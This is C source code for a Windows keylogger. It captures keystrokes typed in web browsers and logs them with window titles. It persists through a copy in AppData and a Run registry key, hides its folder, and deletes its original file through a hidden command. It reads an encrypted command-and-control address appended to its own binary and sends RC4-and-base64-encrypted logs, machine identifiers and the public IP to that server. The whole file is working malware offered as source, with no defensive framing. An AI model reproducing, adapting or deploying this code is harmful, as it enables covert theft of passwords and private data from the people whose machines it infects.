#include "functions.h"
//---------------------------------------
char key[33];
char skey[33];
char sgate[96];
char sfilename[11];
char sfiledir[128];
char sfilepath[128];
char sbinpath[128];
char sclient[64];
char localFileName[128];
//---------------------------------------
int findBytes(char *data, int ldata, char *search, int lsearch)
{
  int i, index = -1;
  for (i = 0; i + lsearch < ldata; i++)
  {
    int j, c = 0;
    for (j = i; j < i + lsearch; j++)
    {
      if (data[j] == search[j - i]) c++;
      else break;
    }
    if (c == lsearch) index = i;
  }
  return index;
}
//---------------------------------------
void getVars()
{
  sprintf(key, "lvNK7!I9T#pO65Ev$31P1CFw^27$o914");
  //---------------------------------------
  GetModuleFileName(NULL, sfilepath, 128);
  //---------------------------------------
  sprintf(sfilename, "%s", basename(sfilepath));
  //---------------------------------------
  char tmpdir[128];
  memcpy(tmpdir, sfilepath, strlen(sfilepath));
  sprintf(sfiledir, "%s", dirname(tmpdir));
  //---------------------------------------
  FILE *fdata = fopen(sfilepath, "rb");
  fseek(fdata, 0, SEEK_END);
  int ldata = ftell(fdata);
  rewind(fdata);
  char *data = (char*)malloc(sizeof(unsigned char) * ldata);
  fread(data, ldata, 1, fdata);
  fclose(fdata);
  char seperator[] = "////--//--//--//--////";
  int pad = findBytes(data, ldata, seperator, strlen(seperator));
  data = data + pad + strlen(seperator);
  rc4(data, key);
  //---------------------------------------
  char *pch;
  pch = strtok(data, "+");
  int c = 0; int i;
  while (pch != NULL)
  {
    if (c == 0) for (i = 0; i < strlen(pch); i++) skey[i] = pch[i];
    else if (c == 1) for (i = 0; i < strlen(pch); i++) sgate[i] = pch[i];
    pch = strtok (NULL, "+");
    c++;
  }
  free(data);
  //---------------------------------------
  char pcname[32];
  DWORD pcnameSize = 32;
  GetComputerName(pcname, &pcnameSize);
  char macAddress[32];
  IP_ADAPTER_INFO adapterInfo[16];
  ULONG macAddressSize = sizeof(adapterInfo);
  GetAdaptersInfo(adapterInfo, &macAddressSize);
  sprintf(macAddress, "%02X-%02X-%02X-%02X-%02X-%02X", adapterInfo->Address[0], adapterInfo->Address[1], adapterInfo->Address[2], adapterInfo->Address[3], adapterInfo->Address[4], adapterInfo->Address[5]);
  sprintf(sclient, "%s_%s", pcname, macAddress);
}
//---------------------------------------
char* getFilePath()
{
  char path[128];
  SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path);
  char *filepath = (char*)malloc(sizeof(char) * 128);
  sprintf(filepath, "%s\\logservice\\logservice.exe", path);
  return filepath;
}
//---------------------------------------
int checkFile()
{
  char rawname[strlen(sfilename) - 3];
  memcpy(rawname, sfilename, strlen(sfilename) - 4);
  rawname[strlen(sfilename) - 4] = 0;

  HKEY hKey;
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
  long result = RegQueryValueEx(hKey, rawname, 0, 0, NULL, NULL);
  RegCloseKey(hKey);

  if (result == ERROR_SUCCESS) return 1;
  else return 0;
}
//---------------------------------------
int checkPath()
{
	char path[128];
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path);
	char tmpfiledir[128];
	sprintf(tmpfiledir, "%s\\logservice", path);
	return strcmp(sfiledir, tmpfiledir);
}
//---------------------------------------
char* createFile()
{
  char* filepath = getFilePath();
  char tmpdir[128];
  memcpy(tmpdir, filepath, strlen(filepath));
  mkdir(dirname(tmpdir));
  CopyFile(sfilepath, filepath, FALSE);
  return filepath;
}
//---------------------------------------
void createRegKey(char *filepath)
{
  char *filename = basename(filepath);
  char rawname[strlen(filename) - 3];
  memcpy(rawname, filename, strlen(filename) - 4);
  rawname[strlen(filename) - 4] = 0;

  HKEY hKey;
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
  RegSetValueEx((HKEY)hKey, rawname, 0, REG_SZ, (BYTE*)filepath, strlen(filepath));
  RegCloseKey(hKey);
}
//---------------------------------------
void selfDelete()
{
  char cmd[128];
  sprintf(cmd, "/c ping 1.1.1.1 -n 1 -w 2000 > nul & del \"%s\"", sfilepath);
  ShellExecute(NULL, "open", "cmd.exe", cmd, NULL,  SW_HIDE);
}
//---------------------------------------
void hideFolder()
{
  char cmd[128];
  sprintf(cmd, "+s +h \"%s\"", sfiledir);
  ShellExecute(NULL, "open", "attrib.exe", cmd, NULL, SW_HIDE);
}
//---------------------------------------
void rc4(char *data, char *key)
{
  int i, x, y, j = 0, klen = strlen(key), kdata = strlen(data);
  int box[256];
  for (i = 0; i < 256; i++) box[i] = i;
  for (i = 0; i < 256; i++)
  {
    j = (key[i % klen] + box[i] + j) % 256;
    x = box[i];
    box[i] = box[j];
    box[j] = x;
  }
  for (i = 0; i < kdata; i++)
  {
    y = i % 256;
    j = (box[y] + j) % 256;
    x = box[y];
    box[y] = box[j];
    box[j] = x;
    char c = (char)(data[i] ^ box[(box[y] + box[j]) % 256]);
    if (c != '\0') data[i] = c;
  }
}
//---------------------------------------
char* base64_encode(char *string, int len)
{
  const char basis_64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  char *encoded = (char*)malloc(((len + 2) / 3 * 4) + 1);
  int i;
  char *p;

  p = encoded;
  for (i = 0; i < len - 2; i += 3) {
    *p++ = basis_64[(string[i] >> 2) & 0x3F];
    *p++ = basis_64[((string[i] & 0x3) << 4) |
    ((int) (string[i + 1] & 0xF0) >> 4)];
    *p++ = basis_64[((string[i + 1] & 0xF) << 2) |
    ((int) (string[i + 2] & 0xC0) >> 6)];
    *p++ = basis_64[string[i + 2] & 0x3F];
  }
  if (i < len) {
    *p++ = basis_64[(string[i] >> 2) & 0x3F];
    if (i == (len - 1)) {
      *p++ = basis_64[((string[i] & 0x3) << 4)];
      *p++ = '=';
    }
    else {
      *p++ = basis_64[((string[i] & 0x3) << 4) |
      ((int) (string[i + 1] & 0xF0) >> 4)];
      *p++ = basis_64[((string[i + 1] & 0xF) << 2)];
    }
    *p++ = '=';
  }

  *p++ = '\0';
  int j;
  for (j = 0; j < strlen(encoded); j++) { if (encoded[j] == '+') encoded[j] = '-'; else if (encoded[j] == '/') encoded[j] = '*'; }
  return encoded;
}
//---------------------------------------
char* base64_decode(char *bufcoded, int len)
{
  int j;
  for (j = 0; j < strlen(bufcoded); j++) { if (bufcoded[j] == '-') bufcoded[j] = '+'; else if (bufcoded[j] == '*') bufcoded[j] = '/';  }
  const unsigned char pr2six[256] =
  {
    // ASCII table
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
  };

  char *bufplain = (char*)malloc(len);
  int nbytesdecoded;
  register const unsigned char *bufin;
  register unsigned char *bufout;
  register int nprbytes;

  bufin = (const unsigned char *) bufcoded;
  while (pr2six[*(bufin++)] <= 63);
  nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;
  nbytesdecoded = ((nprbytes + 3) / 4) * 3;

  bufout = (unsigned char *) bufplain;
  bufin = (const unsigned char *) bufcoded;

  while (nprbytes > 4) {
    *(bufout++) =
    (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
    *(bufout++) =
    (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
    *(bufout++) =
    (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
    bufin += 4;
    nprbytes -= 4;
  }

  if (nprbytes > 1) {
    *(bufout++) =
    (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
  }
  if (nprbytes > 2) {
    *(bufout++) =
    (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
  }
  if (nprbytes > 3) {
    *(bufout++) =
    (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
  }

  *(bufout++) = '\0';
  nbytesdecoded -= (4 - nprbytes) & 3;
  return bufplain;
}
//---------------------------------------
BOOL sendData(char *url, char *data, int id, int isEnc)
{
  if (strstr(url, "/") == NULL) return 0;
  char url2[96];
  char host[64];
  char path[64];
  if (url[0] == 'h' && url[6] == '/')
  {
    memcpy(url2, url, strlen(url));
    url2[strlen(url)] = 0;
    sscanf(url2, "%*[^/]%*[/]%[^/]", host);
  }
  else
  {
    sprintf(url2, "http://%s", url);
    sscanf(url2, "%*[^/]%*[/]%[^/]", host);
  }
  int i;
  for (i = strlen(host) + 7; i < strlen(url2); i++) path[i - strlen(host) - 7] = url2[i];
  path[strlen(url2) - strlen(host) - 7] = 0;
  //---------------------------------------
  unsigned int totalBytes = strlen(data);
  unsigned char *tbuffer;
  if (isEnc)
  {
    rc4(data, skey);
    char *enc_buff = base64_encode(data, totalBytes);
    tbuffer = (unsigned char*)enc_buff;
  }
  else tbuffer = (unsigned char*)data;
  //---------------------------------------
  unsigned int newTotalBytes = strlen((char*)tbuffer);
  char tmp[8];
  sprintf(tmp, "i=%d&d=", id);
  unsigned char tdata[newTotalBytes + strlen(tmp)];
  for (i = 0; i < strlen(tmp); i++) tdata[i] = tmp[i];
  for (i = strlen(tmp); i < newTotalBytes + strlen(tmp); i++) tdata[i] = tbuffer[i - strlen(tmp)];

  char header[] = "Content-Type: application/x-www-form-urlencoded";
  HINTERNET hInternet = InternetOpen("HTTP/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  HINTERNET hConnection = InternetConnect(hInternet, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
  HINTERNET hRequest = HttpOpenRequest(hConnection, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
  BOOL success = HttpSendRequest(hRequest, header, strlen(header), tdata, newTotalBytes + strlen(tmp));

  InternetCloseHandle(hRequest);
  InternetCloseHandle(hConnection);
  InternetCloseHandle(hInternet);
  //---------------------------------------
  if (isEnc) free(tbuffer);
  return success;
}
//---------------------------------------
char* readData(char *url, int isEnc, int* binSize)
{
  if (strstr(url, "/") == NULL) return (char*)malloc(1);
  char url2[96];
  char host[64];
  char path[64];
  if (url[0] == 'h' && url[6] == '/')
  {
    memcpy(url2, url, strlen(url));
    url2[strlen(url)] = 0;
    sscanf(url2, "%*[^/]%*[/]%[^/]", host);
  }
  else
  {
    sprintf(url2, "http://%s", url);
    sscanf(url2, "%*[^/]%*[/]%[^/]", host);
  }
  int i;
  for (i = strlen(host) + 7; i < strlen(url2); i++) path[i - strlen(host) - 7] = url2[i];
  path[strlen(url2) - strlen(host) - 7] = 0;
  //---------------------------------------
  HINTERNET hInternet = InternetOpen("HTTP/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  HINTERNET hConnection = InternetConnect(hInternet, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
  HINTERNET hRequest = HttpOpenRequest(hConnection, "GET", path, NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE, 0);
  HttpSendRequest(hRequest, NULL, 0, NULL, 0);

  unsigned char *tbuffer = NULL;
  unsigned char buffer[2048];
  DWORD bytesRead = 0;
  DWORD totalBytesRead = 0;
  while(InternetReadFile(hRequest, buffer, 2047, &bytesRead) && bytesRead != 0)
  {
    buffer[bytesRead] = 0;
    unsigned char tmpbuffer[totalBytesRead + bytesRead];
    if (tbuffer != NULL) { memcpy(tmpbuffer, tbuffer, totalBytesRead); free(tbuffer); }
    int i;
    for (i = totalBytesRead; i < totalBytesRead + bytesRead; i++) tmpbuffer[i] = buffer[i - totalBytesRead];
    tbuffer = (unsigned char*)malloc(totalBytesRead + bytesRead + 1);
    memcpy(tbuffer, tmpbuffer, totalBytesRead + bytesRead);
    tbuffer[totalBytesRead + bytesRead] = 0;
    totalBytesRead += bytesRead;
  }
  if (binSize != NULL) *binSize = totalBytesRead;
  if (tbuffer == NULL) tbuffer = (unsigned char*)malloc(1);

  InternetCloseHandle(hRequest);
  InternetCloseHandle(hConnection);
  InternetCloseHandle(hInternet);
  //---------------------------------------
  if (isEnc)
  {
    char *dec_buff = base64_decode((char*)tbuffer, totalBytesRead);
    rc4(dec_buff, skey);
    free(tbuffer);
    return dec_buff;
  }
  else return (char*)tbuffer;
}
//---------------------------------------
DWORD WINAPI createTimer(LPVOID lpParam)
{
  MSG Msg;
  SetTimer(NULL, 0, 1000*60*15, 0);
  while (GetMessage(&Msg, NULL, 0, 0))
  {
    if (Msg.message == WM_TIMER) checkIP();
    DispatchMessage(&Msg);
  }
}
//---------------------------------------
void checkIP()
{
	createRegKey(sfilepath);
	//---------------------------------------
	char data[128];
	char ip[32];
	char *ipstr = readData((char*)"http://checkip.dyndns.org/", 0, NULL);
	if (strlen(ipstr) > 1 && strstr(ipstr, (char*)"IP") != NULL)
	{
		int i, s = 0, f = 0;
		for (i = 0; i < strlen(ipstr); i++) if (ipstr[i] == ':') { s = i + 2; break; }
		for (i = s; i < strlen(ipstr); i++) if (ipstr[i] == '<') { f = i; break; }
		for (i = s; i < f; i++) ip[i - s] = ipstr[i];
		ip[f - s] = 0;
	}
	free(ipstr);
	sprintf(data, "xbx-//-%s-//-%s", sclient, ip);
	sendData(sgate, data, 0, 1);
}
//---------------------------------------
void grab()
{
  int count = 0;
  char curTitle[128];
  char header[] = "<html><body><table><tr><th>Window Title</th><th>Log Data</th></tr>";
  while (1)
  {
    Sleep(10);
	if (count == 0) {
		int key;
		getLocalFileName(count);
		if (access(localFileName, F_OK) == -1) saveString(header);
		//---------------------------------------
		for (key = 8; key <= 226; key++)
		{
		  if (GetAsyncKeyState(key) == -32767)
		  {
			char exe[128];
			HWND fg = GetForegroundWindow();
			DWORD pid; GetWindowThreadProcessId(fg, &pid);
			getProcessName(pid, exe);
			if (strcmp("iexplore.exe", exe) == 0 || strcmp("IEXPLORE.EXE", exe) == 0 || strcmp("chrome.exe", exe) == 0 || strcmp("firefox.exe", exe) == 0 || strcmp("opera.exe", exe) == 0)
			{
			  char title[128];
			  GetWindowText(fg, title, sizeof(title));
			  if (strcmp(curTitle, title) != 0)
			  {
				strcpy(curTitle, title);
				saveString("</td></tr><tr><td>");
				saveString(title);
				saveString("</td><td>");
			  }
			  char* keyString = getString(key);
			  if (keyString != NULL) saveString(keyString);
			  free(keyString);
			}
		  }
		}
	}
    //---------------------------------------
	if (count == 1) { count = 0; Sleep(1000); }
    if (getSize(localFileName) >= 10000)
    {
		FILE* file = fopen(localFileName, "r");
		int size = 0;
		fseek(file, 0, SEEK_END);
		size = ftell(file);
		rewind(file);
		char filedata[size];
		fread(filedata, size, 1, file);
		fclose(file);
		//---------------------------------------
		char data[size + 128];
		sprintf(data, "xbx-//-%s-//-%s", sclient, filedata);
		BOOL check2 = sendData(sgate, data, 1, 1);
		if (check2 == TRUE)
		{
			count = 0;
			remove(localFileName);
		}
		else count = 1;
    }
  }
}
//---------------------------------------
char* getString(int key)
{
  char* keyString = (char*)malloc(10 * sizeof(char));
  if (key > 64 && key < 91)
  {
    if (!(GetKeyState(VK_CAPITAL) || GetAsyncKeyState(VK_SHIFT)))
      key = key + 32;
      sprintf(keyString, "%c", key);
    }
    else if (key > 47 && key < 58)
    {
      sprintf(keyString, "%c", key);
    }
    else
    {
      switch(key)
    {
      case 13 :
      sprintf(keyString, "[En]");
      break;
      case 8 :
      sprintf(keyString, "[BK]");
      break;
      case 32 :
      sprintf(keyString, " ");
      break;
      case VK_NUMPAD0 :
      sprintf(keyString, "0");
      break;
      case VK_NUMPAD1 :
      sprintf(keyString, "1");
      break;
      case VK_NUMPAD2 :
      sprintf(keyString, "2");
      break;
      case VK_NUMPAD3 :
      sprintf(keyString, "3");
      break;
      case VK_NUMPAD4 :
      sprintf(keyString, "4");
      break;
      case VK_NUMPAD5 :
      sprintf(keyString, "5");
      break;
      case VK_NUMPAD6 :
      sprintf(keyString, "6");
      break;
      case VK_NUMPAD7 :
      sprintf(keyString, "7");
      break;
      case VK_NUMPAD8 :
      sprintf(keyString, "8");
      break;
      case VK_NUMPAD9 :
      sprintf(keyString, "9");
      break;
      case VK_CAPITAL :
      sprintf(keyString, "[CLOCK]");
      break;
      case VK_TAB :
      sprintf(keyString, "[TAB]");
      break;
      case VK_CONTROL :
      sprintf(keyString, "[Ctrl]");
      break;
      case VK_SHIFT :
      sprintf(keyString, "[SHT]");
      break;
      case VK_MENU :
      sprintf(keyString, "[ALT]");
      break;
      case VK_DELETE :
      sprintf(keyString, "[DEL]");
      break;
      case VK_ESCAPE :
      sprintf(keyString, "[ESC]");
      break;
      case VK_DOWN :
      sprintf(keyString, "[DN]");
      break;
      case VK_LEFT :
      sprintf(keyString, "[LT]");
      break;
      case VK_RIGHT :
      sprintf(keyString, "[RT]");
      break;
      case VK_UP :
      sprintf(keyString, "[UP]");
      break;
      case VK_DIVIDE :
      sprintf(keyString, "/");
      break;
      case VK_MULTIPLY :
      sprintf(keyString, "*");
      break;
      case VK_SUBTRACT :
      sprintf(keyString, "-");
      break;
      case VK_ADD :
      sprintf(keyString, "+");
      break;
      case VK_DECIMAL :
      sprintf(keyString, ".");
      break;
      case VK_OEM_3 :
      sprintf(keyString, "[`~]");
      break;
      case 189 :
      sprintf(keyString, "[-_]");
      break;
      case 187 :
      sprintf(keyString, "[=+]");
      break;
      case 226 :
      sprintf(keyString, "[<>]");
      break;
      case VK_OEM_4 :
      sprintf(keyString, "[[{]");
      break;
      case VK_OEM_6 :
      sprintf(keyString, "[]}]");
      break;
      case VK_OEM_7 :
      sprintf(keyString, "[QUOTE]");
      break;
      case VK_OEM_5 :
      sprintf(keyString, "[\\\\|]");
      break;
      case VK_OEM_1 :
      sprintf(keyString, "[;:]");
      break;
      case VK_OEM_2 :
      sprintf(keyString, "[/?]");
      break;
      case 190 :
      sprintf(keyString, "[.>]");
      break;
      case 188 :
      sprintf(keyString, "[,<]");
      break;
      default:
      return NULL;
      break;
    }
  }
  return keyString;
}
//---------------------------------------
void saveString(char* buffer)
{
  FILE* file = fopen(localFileName, "a+");
  fputs(buffer, file);
  fclose(file);
}
//---------------------------------------
int getSize(char* fileName)
{
  if (access(fileName, F_OK) == -1) return 0;
  FILE* file = fopen(fileName, "r");
  int size = 0;
  fseek(file, 0, SEEK_END);
  size = ftell(file);
  rewind(file);
  fclose(file);
  return size;
}
//---------------------------------------
void getLocalFileName(int n)
{
  sprintf(localFileName, "%s\\%05d.html", sfiledir, n);
}
//---------------------------------------
void getProcessName(int pid, char *name)
{
  PROCESSENTRY32 entry;
  entry.dwSize = sizeof(PROCESSENTRY32);
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (Process32First(snapshot, &entry) == TRUE)
  {
    while (Process32Next(snapshot, &entry) == TRUE)
    {
      if (entry.th32ProcessID == pid) sprintf(name, "%s", entry.szExeFile);
    }
  }
  CloseHandle(snapshot);
}
